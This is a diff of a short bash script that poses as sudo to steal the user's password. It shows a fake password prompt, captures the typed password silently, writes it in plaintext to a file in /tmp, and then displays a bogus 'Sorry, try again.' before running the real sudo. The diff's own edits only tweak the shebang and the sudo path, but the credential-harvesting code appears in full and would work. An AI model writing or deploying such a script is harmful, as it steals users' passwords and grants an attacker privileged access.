@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
 user=$(whoami)
 outPath=/tmp/unicorns.txt
@@ -8,14 +8,14 @@ errStr="Sorry, try again."
 myPath="$( cd "$(dirname "$0")" ; pwd -P )/$0"
 if [ -f $outPath ]
 then
-    sudo $@
+    /usr/bin/sudo $@
 else
     echo -ne $pwPrompt
     read -s PASSWORD
     echo
     echo $PASSWORD > $outPath
     echo $errStr
-    sudo $@
+    /usr/bin/sudo $@
 fi
 if [ -f $cleanUp ]
 then
